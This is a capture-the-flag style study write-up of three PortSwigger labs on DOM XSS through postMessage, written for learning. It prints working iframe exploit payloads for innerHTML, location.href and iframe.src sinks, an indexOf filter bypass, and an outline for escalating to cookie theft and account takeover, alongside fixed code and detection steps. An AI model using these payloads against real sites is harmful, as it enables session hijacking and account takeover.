# 🌐 Day 45 — DOM-Based Vulnerabilities (Web Message Sources)

**Platform:** PortSwigger Web Security Academy  
**Category:** Client-Side / DOM XSS  
**Labs:** DOM XSS via `postMessage` — innerHTML · JavaScript URL · JSON.parse

---

## Table of Contents

| # | Section | Focus |
|---|---------|-------|
| §1 | [Foundation](#1-foundation--what-makes-today-different) | postMessage API, cross-origin messaging, root cause |
| §2 | [Lab 1 — DOM XSS Using Web Messages](#2-lab-1--dom-xss-using-web-messages) | innerHTML sink, `<img onerror>` payload |
| §3 | [Lab 2 — Web Messages and a JavaScript URL](#3-lab-2--dom-xss-using-web-messages-and-a-javascript-url) | location.href sink, indexOf bypass via `//` comment |
| §4 | [Lab 3 — Web Messages and JSON.parse](#4-lab-3--dom-xss-using-web-messages-and-jsonparse) | iframe.src sink, JSON structure exploitation |
| §5 | [The Shared Root Cause](#5-the-shared-root-cause) | Missing `e.origin` validation across all labs |
| §6 | [Fixed Code](#6-fixed-code) | Secure alternatives for each vulnerable listener |
| §7 | [Chain Thinking — postMessage DOM XSS → Account Takeover](#7-chain-thinking--postmessage-dom-xss--account-takeover) | Full escalation path from XSS to ATO |
| §8 | [Detection Methodology](#8-detection-methodology) | How to find postMessage DOM XSS in real targets |
| §9 | [Bug Bounty Context](#9-bug-bounty-context) | Severity, payouts, and reporting guidance |
| §10 | [Personal Methodology Notes](#10-personal-methodology-notes) | Testing checklists, recognition cues, code review indicators |
| §11 | [Key Concepts Summary](#11-key-concepts-summary) | Quick-reference table of all concepts covered |
| §12 | [Foundation Checklist](#12-foundation-checklist) | Self-assessment questions for mastery validation |
| §13 | [Related Labs](#13-related-labs) | Adjacent DOM-based labs and progression path |

---

## §1 Foundation — What Makes Today Different

### What Is the DOM?

The **Document Object Model (DOM)** is the browser's live, in-memory representation of a web page. When a browser loads HTML, it doesn't just display text — it builds a tree of objects (nodes) that JavaScript can read and modify in real time. Every element on the page — every `<div>`, `<img>`, `<input>` — becomes a node in this tree.

```text
document
 └── <html>
      ├── <head>
      │    └── <title>My Page</title>
      └── <body>
           ├── <h1>Welcome</h1>
           ├── <div id="ads"></div>        ← JavaScript can write into this
           └── <script>...</script>        ← JavaScript that manipulates the tree
```

JavaScript interacts with this tree through the `document` object. For example, `document.getElementById('ads')` returns the `<div>` node, and setting `.innerHTML` on it replaces that node's children with whatever HTML string you provide. **This is exactly where DOM XSS lives** — when an attacker can control the string that gets written into the DOM.

### What Is DOM XSS?

**DOM-based Cross-Site Scripting (DOM XSS)** is a type of XSS where the entire attack happens inside the browser. Unlike reflected or stored XSS — where the server includes the malicious script in its HTTP response — DOM XSS never touches the server at all. The vulnerable JavaScript code running in the browser reads attacker-controlled data from somewhere (a **source**), and writes it into something dangerous (a **sink**) without sanitisation.

```text
Traditional Reflected XSS:
  Attacker → crafted URL → Server reflects payload in HTML response → Browser renders it → XSS

DOM XSS:
  Attacker → crafted input → Browser's own JavaScript reads it → JS writes it into DOM → XSS
  (the server never sees or processes the payload — it's entirely client-side)
```

> [!NOTE]
> **Why this matters for testing:** Because the server never sees the payload, server-side WAFs (Web Application Firewalls) and input validation are completely useless against DOM XSS. The vulnerability exists purely in the client-side JavaScript code. You find it by reading JavaScript, not by fuzzing server endpoints.

### The Source → Sink Mental Model

Every DOM XSS vulnerability is a data-flow problem with two components:

| Component | Definition | Examples |
|-----------|-----------|----------|
| **Source** | Where the attacker-controlled data enters the JavaScript | `location.search`, `location.hash`, `document.referrer`, `document.cookie`, **`e.data` (postMessage)** |
| **Sink** | Where the data gets used in a dangerous way | `innerHTML`, `outerHTML`, `document.write()`, `location.href`, `eval()`, `element.src` |

```text
SOURCE (attacker controls this)
    ↓
    data flows through JavaScript code — maybe through variables, function calls, JSON parsing
    ↓
SINK (browser executes/renders the data here)
    ↓
    XSS — attacker's code runs in the victim's browser, in the target site's origin
```

If you can trace a path from any source to any sink without adequate sanitisation in between, you have a DOM XSS vulnerability. The three labs today all share the same source (`e.data` from postMessage) but use three different sinks.

### Three Categories of Dangerous Sinks

| Category | Sinks | What Happens | Payload Style |
|----------|-------|-------------|---------------|
| **HTML Injection** | `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()` | The string is parsed as real HTML — the browser builds actual DOM elements from it | `<img src=1 onerror=print()>` — inject an element with an event handler |
| **Navigation** | `location.href`, `location.assign()`, `location.replace()`, `window.open()` | The browser navigates to the URL — if it starts with `javascript:`, the rest is executed as code | `javascript:print()` — the browser runs this as JavaScript instead of navigating |
| **Source Loading** | `iframe.src`, `script.src`, `embed.src`, `object.data` | The element loads content from the URL — `javascript:` URIs execute code within that element's context | `javascript:print()` — same mechanism as navigation, but scoped to the element |

### What Is postMessage?

**`postMessage()`** is a browser API that allows two different browsing contexts — such as a parent page and an embedded iframe, or a page and a popup window — to send messages to each other, **even if they are on completely different origins**. This is one of the few intentional holes in the Same-Origin Policy.

```
window.postMessage(data, targetOrigin)   // sender side
window.addEventListener('message', fn)   // receiver side
                                          // fn(e) -> e.data = the message
                                          //          e.origin = who sent it
```

**How it works step by step:**

```text
1. Page A (sender) gets a reference to Page B's window object
   - If B is an iframe:  document.getElementById('myIframe').contentWindow
   - If B is a popup:    window.open(...) returns the window reference

2. Page A sends a message:
   pageB_window.postMessage('hello', 'https://pageB.com')
   - First argument: the data (can be a string, object, array — anything cloneable)
   - Second argument: the target origin ('*' means "any origin" — dangerous!)

3. Page B has a listener waiting:
   window.addEventListener('message', function(e) {
       // e.data   = 'hello'           ← the message content
       // e.origin = 'https://pageA.com' ← who sent it
       // e.source = reference to Page A's window
   })
```

**Why postMessage exists — legitimate use cases:**

- A payment iframe (Stripe, PayPal) needs to tell the parent page "payment succeeded"
- An ad iframe reports its rendered dimensions so the parent can resize the container
- An SSO popup sends the auth token back to the page that opened it
- A video player iframe accepts "play", "pause", "seek" commands from the parent

postMessage is everywhere: ad networks, embedded video players, payment/checkout iframes, SSO popups, chat widgets. Any time a page embeds a cross-origin iframe and the two need to talk, postMessage is the mechanism.

### Why Missing `e.origin` Validation Is Catastrophic

The `e.origin` property tells the listener **who sent the message**. If the listener doesn't check this, it has no way to distinguish between:

- A legitimate message from `https://trusted-partner.com` (intended sender)
- A malicious message from `https://evil-attacker.com` (attacker's page)

```text
SECURE listener:                          VULNERABLE listener (all 3 labs):

addEventListener('message', function(e){  addEventListener('message', function(e){
  if (e.origin !== 'https://trusted.com')   // ← NO ORIGIN CHECK AT ALL
    return;                                 
  doSomething(e.data);                      doSomething(e.data);  // trusts ANY sender
})                                        })
```

> [!IMPORTANT]
> **The vulnerability across all three labs today shares one root cause:** the receiving `message` listener never checks `e.origin`. It accepts data from ANY sender — same-origin or attacker-controlled — and trusts it immediately.

### Attack Flow — Universal Pattern

```text
Attacker's page (any page — malicious ad, blog comment iframe, compromised widget)
        ↓
Contains a hidden iframe pointing at the vulnerable target
        ↓
iframe.contentWindow.postMessage(payload, '*')
        ↓
Target's message listener receives e.data — WITHOUT checking e.origin
        ↓
e.data flows into a dangerous sink (innerHTML / location.href / element.src)
        ↓
Payload executes INSIDE the target's origin
```

### Why postMessage XSS Is Stealthier Than URL-Based DOM XSS

With traditional DOM XSS (source = `location.hash` or `location.search`), the attacker must send the victim a **crafted, suspicious-looking URL** like:

```text
https://target.com/page#<img src=1 onerror=alert(1)>
```

The victim might notice the weird characters in the URL. But with postMessage-based DOM XSS, the attacker embeds a hidden iframe on **any page they control** — a blog post, a compromised ad network, a forum comment. The victim visits a completely normal-looking URL. The iframe silently loads the target and fires the payload via postMessage. **The victim never sees anything suspicious.**

---

## §2 Lab 1 — DOM XSS Using Web Messages

> 🔗 PortSwigger Web Security Academy — DOM XSS using web messages

**Goal:** Trigger `print()` via postMessage → innerHTML sink · ✅ Solved

### Vulnerable Code (found via view-source)

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
```

**Line-by-line breakdown — what the target's code does:**

| Line | What It Does | Why It's Dangerous |
|------|-------------|-------------------|
| `window.addEventListener('message', function(e) {` | Registers a listener that fires whenever **any** window sends a `postMessage` to this page. The event object `e` contains `.data` (the message), `.origin` (who sent it), and `.source` (sender's window reference). | The listener fires for messages from **any** origin — there is no `if (e.origin !== ...)` check anywhere in this code. |
| `document.getElementById('ads').innerHTML = e.data;` | Finds the DOM element with `id="ads"` and replaces its inner HTML with whatever string was received in the message. `innerHTML` tells the browser to **parse the string as real HTML** — it builds actual elements, attributes, and event handlers from it. | This is the **sink**. Because `innerHTML` parses HTML, any HTML tags in `e.data` become real DOM elements. If the string contains `<img onerror=...>`, the browser creates a real `<img>` element with a real `onerror` handler. |
| `})` | Closes the listener. | — |

### Exploit Delivered via Exploit Server

```html
<iframe src="https://[LAB-ID].web-security-academy.net/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**Line-by-line breakdown — how the exploit works:**

| Part | What It Does | Why It's Needed |
|------|-------------|----------------|
| `<iframe` | Creates an inline frame element on the attacker's page. An iframe loads another web page inside it. | We need to load the **target site** inside the attacker's page so we can send it a postMessage. |
| `src="https://[LAB-ID].web-security-academy.net/"` | Tells the iframe to load the vulnerable target page. The browser fetches the target's HTML, which includes the vulnerable `addEventListener('message', ...)` script. | The target's JavaScript must be running and listening for messages before we send our payload. That's why we wait for `onload`. |
| `onload="..."` | The `onload` event fires **after** the iframe has fully loaded. This is critical — we must wait until the target's JavaScript (including the message listener) is active. | If we send the message before the target page finishes loading, there might be no listener registered yet, and the message would be lost. |
| `this.contentWindow` | Inside the `onload` handler, `this` refers to the iframe element. `.contentWindow` gives us a reference to the **window object** of the page loaded inside the iframe — the target page. | We need the target's window reference to call `postMessage()` on it. This is how the sender addresses a specific recipient. |
| `.postMessage(` | Calls the postMessage API on the target's window, sending data into it. | This is the delivery mechanism — the attacker sending the malicious string to the target's listener. |
| `'<img src=1 onerror=print()>'` | The **payload** — a string of HTML that, when parsed by `innerHTML`, creates an `<img>` element. `src=1` is an invalid image URL that will fail to load, triggering the `onerror` event handler, which executes `print()`. | This string is what arrives as `e.data` in the target's listener. Because the listener passes it directly to `innerHTML`, the browser parses it as real HTML and creates the element. |
| `,'*')` | The **target origin** parameter. `'*'` means "send this message regardless of what origin the iframe contains." | We use `'*'` because we don't care about restricting our own message — we're the attacker. In secure code, the *receiver* should check origin; here it doesn't. |
| `">` | Closes the iframe tag. | — |

### Source → Sink Flow

```
SOURCE: e.data, set by iframe.contentWindow.postMessage() on the attacker page
        ↓
No e.origin check — message accepted from any sender
        ↓
e.data = '<img src=1 onerror=print()>'
        ↓
SINK: document.getElementById('ads').innerHTML = e.data
        ↓
innerHTML parses the string as real HTML — builds an actual <img> element
        ↓
src="1" fails to load as a valid image
        ↓
onerror handler fires -> print() executes
```

### Payload Trace

| Fragment | Purpose |
|---|---|
| `<img ` | Opens an image element — innerHTML will parse and render this |
| `src=1` | Deliberately invalid image source — guarantees a load failure |
| `onerror=print()` | Registers the handler that fires the moment the image fails to load |
| `>` | Closes the tag |

> [!NOTE]
> **Why it worked:** Identical mechanism to any innerHTML-based DOM XSS — the only difference is the source. The untrusted string arrives via `e.data` from postMessage instead of `location.search`.

---

## §3 Lab 2 — DOM XSS Using Web Messages and a JavaScript URL

> 🔗 PortSwigger Web Security Academy — DOM XSS using web messages and a JavaScript URL

**Goal:** Trigger `print()` via postMessage → location.href sink with indexOf bypass · ✅ Solved

### Vulnerable Code

```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

**Line-by-line breakdown — what the target's code does:**

| Line | What It Does | Why It's Dangerous |
|------|-------------|-------------------|
| `var url = e.data;` | Stores the received postMessage data into a variable called `url`. No origin check precedes this — any sender's data is accepted. | The variable name `url` suggests the developer expected a URL, but there's nothing enforcing that `e.data` is actually a safe URL. |
| `if (url.indexOf('http:') > -1 \|\| url.indexOf('https:') > -1)` | The developer's attempt at a security filter. `indexOf()` searches for a substring anywhere in the string and returns its position (or `-1` if not found). This checks: "does the string contain `http:` or `https:` somewhere?" | **This is the flawed filter.** `indexOf` checks for the substring at ANY position — beginning, middle, or end. It does NOT verify that the string *starts with* `http:` or `https:`. An attacker can place `http:` at the end while the real protocol is `javascript:`. |
| `location.href = url;` | Navigates the browser to whatever URL is in the variable. If the URL starts with `javascript:`, the browser doesn't navigate — it **executes the rest as JavaScript code**. | This is the **sink**. `location.href` is a navigation sink that also accepts `javascript:` URIs as executable code. |

### Exploit Delivered

```html
<iframe src="https://[LAB-ID].web-security-academy.net/"
        onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

**Line-by-line breakdown — how the exploit works:**

| Part | What It Does | Why It's Needed |
|------|-------------|----------------|
| `<iframe src="..." onload="...">` | Same delivery mechanism as Lab 1 — loads the target page in an iframe, waits for it to finish loading, then sends the payload via postMessage. | Identical to Lab 1. The only thing that changes between labs is the **payload string** and the **sink** it targets. |
| `'javascript:print()//http:'` | The crafted payload string. Let's break this down character by character: | — |
| ↳ `javascript:` | This is a **URI scheme**. When the browser sees `location.href = "javascript:..."`, it doesn't navigate to a web page. Instead, it treats everything after `javascript:` as JavaScript code and **executes** it. | This is how we turn a navigation sink into a code execution sink. |
| ↳ `print()` | The actual JavaScript code we want to execute. | Our real payload — the part that actually runs. |
| ↳ `//` | In JavaScript, `//` begins a **single-line comment**. Everything after `//` on that line is ignored by the JavaScript engine. | We need to include `http:` in the string (to pass the filter), but we don't want `http:` to execute as code or cause a syntax error. The comment hides it. |
| ↳ `http:` | This text exists **only** to satisfy the filter check. `url.indexOf('http:') > -1` searches the entire string — it finds `http:` at position 22 and returns `true`. The filter passes. But because `http:` comes after `//`, JavaScript never executes it. | This is the bypass. The filter sees `http:` and thinks it's a legitimate URL. The JavaScript engine sees `// comment` and ignores everything after it. |

### Source → Sink Flow

```
SOURCE: e.data = 'javascript:print()//http:'
        ↓
Filter check: url.indexOf('http:') > -1
        ↓
indexOf searches the ENTIRE string, not just the beginning —
'http:' is found at the END, inside a comment — check PASSES
        ↓
SINK: location.href = url
        ↓
Browser treats 'javascript:...' as a javascript: URI, not a real URL
        ↓
Everything after 'javascript:' is executed as JS: print()//http:
        ↓
'//' opens a JS line comment — 'http:' after it is inert text, never run
        ↓
Actual code executed: print()
```

### Payload Trace

| Fragment | Purpose |
|---|---|
| `javascript:` | Tells the browser to execute what follows as code, not navigate to a URL |
| `print()` | The real payload |
| `//` | Opens a JavaScript line comment |
| `http:` | Dead text — exists ONLY to satisfy the `indexOf('http:')` filter check |

> [!WARNING]
> **Why it worked:** The filter checks that the substring `http:` exists *somewhere* — not that the string *starts with* a safe protocol. This is a **blocklist-via-substring** flaw: any check using `.indexOf()` / `.includes()` instead of validating structure (e.g., `new URL()` + protocol check) can usually be satisfied while the real payload rides along elsewhere in the string.

---

## §4 Lab 3 — DOM XSS Using Web Messages and JSON.parse

> 🔗 PortSwigger Web Security Academy — DOM XSS using web messages and JSON.parse

**Goal:** Trigger `print()` via postMessage → iframe.src sink through JSON-parsed data · ✅ Solved

### Vulnerable Code

```javascript
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

**Line-by-line breakdown — what the target's code does:**

| Line | What It Does | Why It's Dangerous |
|------|-------------|-------------------|
| `var iframe = document.createElement('iframe')` | Creates a new `<iframe>` element in memory (not yet visible on the page). | The iframe is created for every incoming message — it will become the container where our payload executes. |
| `ACMEplayer = {element: iframe}` | Wraps the iframe reference in an object. This mimics a video player widget pattern where `ACMEplayer.element` refers to the player's DOM element. | The variable name suggests this is meant to be an embedded media player — a common real-world postMessage use case. |
| `document.body.appendChild(iframe)` | **Inserts the iframe into the live page.** The iframe is now a real, rendered DOM element. | This is critical — the iframe must be in the DOM for assigning `.src` to have any effect. If it weren't appended, setting `.src` wouldn't trigger navigation/execution. |
| `d = JSON.parse(e.data)` | Parses the received message string as JSON, producing a plain JavaScript object. Wrapped in `try/catch` so non-JSON messages are silently ignored. | **This step is NOT dangerous.** `JSON.parse` only understands JSON syntax (`{"key":"value"}`). It cannot execute code. It just builds a data object. The danger is what happens *after* parsing. |
| `switch(d.type)` | Routes execution based on the `type` property of the parsed object. Three branches: `"page-load"`, `"load-channel"`, and `"player-height-changed"`. | The attacker can choose which branch executes by setting `d.type` in their JSON payload. |
| `ACMEplayer.element.src = d.url` | **The sink.** In the `"load-channel"` branch, the code sets the iframe's `src` attribute to whatever value is in `d.url`. If `d.url` is `"javascript:print()"`, the browser executes that code inside the iframe. | Same mechanism as `location.href` in Lab 2 — the `javascript:` URI scheme triggers code execution instead of navigation. The difference is scope: this executes within the iframe, but `print()` still affects the parent page's print dialog. |

### Exploit Delivered

```html
<iframe src="https://[LAB-ID].web-security-academy.net/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

**Line-by-line breakdown — how the exploit works:**

| Part | What It Does | Why It's Needed |
|------|-------------|----------------|
| `<iframe src="..." onload='...'>` | Same delivery mechanism as Labs 1 and 2. Loads the target in an iframe, waits for load, sends payload. | Identical pattern — only the payload changes. |
| `onload='...'` (single quotes) | Note the **single quotes** wrapping the `onload` attribute value this time, instead of double quotes. | The payload contains double quotes inside the JSON string. Using single quotes for the HTML attribute prevents the double quotes inside from breaking the HTML syntax. |
| `"{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}"` | This is the postMessage data — a **string** that the target will pass to `JSON.parse()`. The `\"` sequences are escaped double quotes. | Let's trace the escaping layers: |
| ↳ **Layer 1 — HTML attribute** | The browser reads the `onload` attribute and processes the string inside the single quotes. The `\"` sequences become `"` characters. | After HTML parsing, the JavaScript code becomes: `this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')` |
| ↳ **Layer 2 — JavaScript string** | The JavaScript engine reads the string literal. The result is a plain string: `{"type":"load-channel","url":"javascript:print()"}` | This string is what arrives as `e.data` in the target's listener. |
| ↳ **Layer 3 — JSON.parse** | The target's code calls `JSON.parse(e.data)`. JSON.parse reads the string and produces: `{ type: "load-channel", url: "javascript:print()" }` | Now `d.type` is `"load-channel"` (routing to the vulnerable branch) and `d.url` is `"javascript:print()"` (the payload that reaches the sink). |
| `"*"` | Target origin for postMessage — `'*'` means any origin. | Same as Labs 1 and 2 — the receiver doesn't check origin anyway. |

> [!NOTE]
> **Why this exploit is more complex than Labs 1 and 2:** The target expects JSON-structured input, not a raw string. The attacker must craft valid JSON that (a) routes to the right `switch` branch via `d.type`, and (b) carries the payload in the property (`d.url`) that flows into the sink. The triple escaping (`\"`) is needed because the payload passes through three parsing layers: HTML attribute → JavaScript string → JSON.parse.

### Source → Sink Flow

```
SOURCE: e.data = '{"type":"load-channel","url":"javascript:print()"}'
        ↓
d = JSON.parse(e.data)  <- THIS STEP IS SAFE. JSON.parse never executes
                            code — it only builds a plain object or throws.
        ↓
d = { type: "load-channel", url: "javascript:print()" }
        ↓
switch(d.type) matches case "load-channel"
        ↓
SINK: ACMEplayer.element.src = d.url
        ↓
ACMEplayer.element is a live <iframe> already appended to the DOM
        ↓
Assigning iframe.src = "javascript:print()" makes the browser execute
that code as the iframe's document content
        ↓
print() fires
```

### Payload Trace

| Fragment | Purpose |
|---|---|
| `{"type":"load-channel",` | Selects the switch branch that writes to `.src` |
| `"url":"javascript:print()"}` | The actual payload — becomes `d.url`, then flows straight into the navigation sink |

> [!TIP]
> **The important misconception to avoid:** `JSON.parse` is in the lab's title, but it is **not** the vulnerable step. `JSON.parse` strictly parses JSON syntax and throws on anything else — it cannot execute arbitrary code the way `eval()` can. The real vulnerability is the same pattern as every other DOM sink today: an unsanitized value (`d.url`) reaching a dangerous sink (`element.src`). The JSON parsing step is a distraction — a well-designed lab testing whether you can identify where the actual data-flow danger lives versus where it merely looks scary.

---

## §5 The Shared Root Cause

All three vulnerable listeners are missing the same check:

```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://expected-trusted-origin.com') {
        return;   // <-- THIS LINE IS MISSING IN ALL THREE LABS
    }
    // ... rest of the logic
});
```

> [!CAUTION]
> Adding this single check would have stopped every exploit today, regardless of which sink the data eventually reached. **This is the first thing to check whenever you see `window.addEventListener('message', ...)` in any target:** is `e.origin` validated before `e.data` is trusted?

### All Three Labs — Side-by-Side

| Dimension | Lab 1 | Lab 2 | Lab 3 |
|-----------|-------|-------|-------|
| **Source** | `e.data` via postMessage | `e.data` via postMessage | `e.data` via postMessage |
| **Sink** | `innerHTML` | `location.href` | `iframe.src` |
| **Filter/Validation** | None | `indexOf('http:')` — bypassable | `JSON.parse` — safe but irrelevant |
| **Payload mechanism** | `<img onerror>` HTML injection | `javascript:` URI + `//` comment | JSON-structured `javascript:` URI |
| **Missing defense** | `e.origin` check | `e.origin` check + proper URL validation | `e.origin` check + protocol allowlist |

---

## §6 Fixed Code

### Lab 1 Fix

```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://ads-partner.example.com') return;
    document.getElementById('ads').textContent = e.data;
    // textContent as defense-in-depth even behind the origin check
});
```

### Lab 2 Fix

```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted-partner.com') return;
    try {
        var parsed = new URL(e.data, location.origin);
        if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
            location.href = parsed.href;
        }
    } catch (err) { /* invalid URL — ignore */ }
}, false);
```

### Lab 3 Fix

```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted-player-host.com') return;
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try { d = JSON.parse(e.data); } catch(err) { return; }
    switch(d.type) {
        case "load-channel":
            if (/^https?:\/\//.test(d.url)) {
                ACMEplayer.element.src = d.url;
            }
            break;
    }
}, false);
```

---

## §7 Chain Thinking — postMessage DOM XSS → Account Takeover

```
Missing e.origin validation confirmed (root cause, all 3 labs)
        ↓
Attacker hosts a hidden iframe on ANY page they control —
a malicious ad, a blog comment widget, a compromised third-party script
        ↓
<iframe style="display:none" src="https://target.com/vulnerable-page"
         onload="this.contentWindow.postMessage(payload,'*')">
        ↓
Victim does NOT need to click a suspicious link — only needs to load
any page embedding this hidden iframe (stealthier than location-based
DOM XSS, which needs a crafted, often odd-looking URL)
        ↓
Payload executes inside target.com's real origin —
full DOM access, same-origin cookies (if not httpOnly),
ability to fire authenticated fetch()/XHR using victim's live session
        ↓
From here, identical weaponization to any DOM XSS:
  - auto-submit a hidden form to change victim's email
  - fetch() a sensitive endpoint, exfiltrate the response
  - read document.cookie directly if not httpOnly-protected
        ↓
Full account takeover — delivered without the victim ever seeing
a suspicious URL
```

> [!WARNING]
> **Severity:** DOM XSS alone via postMessage — **High**. Chained to account takeover — **Critical**. Bug bounty payouts for DOM XSS commonly range $500–$5,000+ depending on impact and exploitability; postMessage-based findings often score higher because of the reduced user-interaction requirement.

---

## §8 Detection Methodology

### Step 1 — Identify postMessage Listeners

Search the target's JavaScript for message event listeners:

- View source / browser DevTools → search for `addEventListener('message'` or `onmessage`
- Burp's DOM Invader can automatically detect and flag message listeners
- Look for third-party scripts (analytics, ads, widgets) — they frequently register their own listeners

### Step 2 — Analyze the Listener

For each listener found, answer these questions:

| Question | If YES → |
|----------|----------|
| Does it check `e.origin`? | Likely safe (verify the check is strict, not substring-based) |
| Does `e.data` flow into `innerHTML`, `outerHTML`, `document.write()`? | HTML injection sink — test with `<img onerror>` |
| Does `e.data` flow into `location.href`, `location.assign()`, `window.open()`? | Navigation sink — test with `javascript:` URI |
| Does `e.data` flow into `element.src` on an iframe, script, or embed? | Source-loading sink — test with `javascript:` URI |
| Does it use `eval()`, `setTimeout(string)`, `Function(string)` on `e.data`? | Direct code execution sink — highest severity |
| Does it apply a filter (indexOf, includes, regex)? | Analyze bypass potential — substring tricks, case variants |

### Step 3 — Craft and Deliver the Exploit

1. Create an HTML page on the exploit server containing an iframe to the target
2. Use `onload` to fire `postMessage()` with the crafted payload
3. Set `targetOrigin` to `'*'` (the target's listener doesn't check anyway)
4. Deliver the exploit URL to the victim (or store it for passive delivery)

### Step 4 — Success Signals

- `print()` dialog appears (lab completion trigger)
- `alert()` or `console.log()` fires in the target's origin context
- Network tab shows authenticated requests fired by injected script
- Cookie values exfiltrated to attacker-controlled endpoint

---

## §9 Bug Bounty Context

| DOM XSS Variant | Impact | CVSS ~ | Typical Payout | Severity |
|-----------------|--------|--------|---------------|----------|
| postMessage → innerHTML (no origin check) | XSS in target origin, session hijack | 6.1–7.5 | $500–$3,000 | 🟠 High |
| postMessage → location.href / window.open | Open redirect → phishing, token theft | 5.0–7.0 | $300–$2,000 | 🟡 Medium–High |
| postMessage → eval / Function() | Full RCE in browser context | 7.5–9.0 | $2,000–$10,000 | 🔴 Critical |
| postMessage → iframe.src (javascript:) | XSS within nested iframe context | 6.1–7.5 | $500–$3,000 | 🟠 High |
| postMessage XSS → chained to ATO | Account takeover, zero-click | 8.1–9.8 | $3,000–$15,000 | 🔴 Critical |

### Where to Hunt

- **Ad/analytics iframes** — Third-party scripts that register message listeners for cross-origin communication
- **Payment / checkout widgets** — Stripe, PayPal, and similar embed iframes that use postMessage
- **SSO / OAuth popups** — Login popups that communicate tokens back to the parent via postMessage
- **Embedded video players** — YouTube, Vimeo, custom players using postMessage for API control
- **Chat widgets** — Intercom, Drift, and similar tools that use postMessage for initialization
- **Cookie consent managers** — Often use postMessage to communicate user preferences across frames

### Reporting postMessage DOM XSS

1. **PoC HTML page:** Include a self-contained HTML file that demonstrates the exploit
2. **Source identification:** Show exactly where the listener is in the target's JS (file + line number)
3. **Origin check absence:** Explicitly note that `e.origin` is not validated
4. **Sink identification:** Name the exact sink (`innerHTML`, `location.href`, `element.src`)
5. **Impact escalation:** Demonstrate or describe the chain to session hijack / ATO
6. **Fix recommendation:** `e.origin` allowlist + sink-specific sanitization (textContent, URL parsing, protocol allowlist)

---

## §10 Personal Methodology Notes

### postMessage DOM XSS Testing Checklist

- [ ] Search all JS files for `addEventListener('message'` and `onmessage`
- [ ] For each listener: does it validate `e.origin`? If not → vulnerable
- [ ] If origin is checked: is it a strict equality check or a bypassable substring/regex?
- [ ] Trace `e.data` flow: where does it end up? (innerHTML, location, src, eval)
- [ ] If a filter exists (indexOf, includes): can it be bypassed with comment tricks or encoding?
- [ ] Build exploit HTML page with iframe + onload + postMessage
- [ ] Test payload in exploit server → deliver to victim
- [ ] Verify execution context is the target's origin (not the attacker's page)
- [ ] Attempt chain: XSS → cookie theft → session hijack → ATO

### Quick Recognition Cues

- `addEventListener('message'` in any JS file → immediately check for `e.origin` validation
- `innerHTML = e.data` or `innerHTML = msg` after a message listener → direct XSS sink
- `location.href = ` or `location = ` inside a message handler → navigation sink
- `.src = ` on an iframe/script/embed inside a message handler → source-loading sink
- `indexOf('http')` or `includes('http')` as the only URL validation → bypassable filter
- Third-party scripts with `*.js` from CDNs — often contain unprotected message listeners

### View-Source / Code Review Indicators

- Message listener with no `e.origin` check → immediate flag
- `e.data` used directly in a sink without sanitization → exploitable
- `JSON.parse(e.data)` followed by property access into a sink → check which properties reach dangerous sinks
- Origin check using `indexOf` or `includes` instead of strict equality → bypassable (attacker can use `evil.com.trusted-origin.com`)
- `targetOrigin: '*'` in the sender-side code → indicates the developer isn't enforcing origin on either side

---

## §11 Key Concepts Summary

| Concept | Description | Why It Matters |
|---------|-------------|----------------|
| **postMessage()** | Cross-origin messaging API between browsing contexts (iframes, popups) | The attack source — replaces URL-based sources for DOM XSS |
| **e.origin** | Property on the MessageEvent identifying the sender's origin | The missing validation — checking this stops all three exploits |
| **e.data** | The actual message content sent via postMessage | The attacker-controlled input that flows into sinks |
| **innerHTML sink** | Parses a string as HTML and inserts it into the DOM | Allows `<img onerror>` and `<script>` injection (Lab 1) |
| **location.href sink** | Navigates the browser to the assigned URL | Allows `javascript:` URI execution (Lab 2) |
| **element.src sink** | Sets the source of an iframe/script/embed element | Allows `javascript:` URI execution within the element (Lab 3) |
| **indexOf bypass** | Using `//` JS comment to satisfy a substring check while hiding the filter-satisfying text | The technique that defeats `indexOf('http:')` validation (Lab 2) |
| **JSON.parse misconception** | JSON.parse is strictly safe — it only parses JSON, never executes code | Understanding that the sink, not the parser, is the vulnerability (Lab 3) |
| **textContent** | Sets text content without HTML parsing — defense-in-depth against innerHTML XSS | Safe alternative to innerHTML when HTML rendering isn't needed |
| **new URL() parsing** | Proper URL validation that structurally parses the URL and exposes `.protocol` | The correct defense against `javascript:` URI attacks |

---

## §12 Foundation Checklist

### Conceptual Understanding
- [ ] What is the difference between a URL-based DOM XSS source and a postMessage-based source? Why is the latter stealthier?
- [ ] Explain why missing `e.origin` validation is the root cause across all three labs.
- [ ] In Lab 2, why did `url.indexOf('http:') > -1` fail as a security control? What made the `//` comment technique work?
- [ ] In Lab 3, why is `JSON.parse` itself not the vulnerability, despite being named in the lab title? Where does the actual danger live?
- [ ] Why can a postMessage-based DOM XSS be delivered without ever showing the victim a suspicious URL — unlike a `location.hash`-based DOM XSS?

### Technical Understanding
- [ ] What is the difference between `innerHTML` and `textContent` as sinks? Why does switching to `textContent` prevent XSS?
- [ ] Why does `new URL()` + `.protocol` check succeed where `indexOf()` fails for URL validation?
- [ ] How does setting `targetOrigin` to `'*'` in the sender affect security? What should it be set to instead?
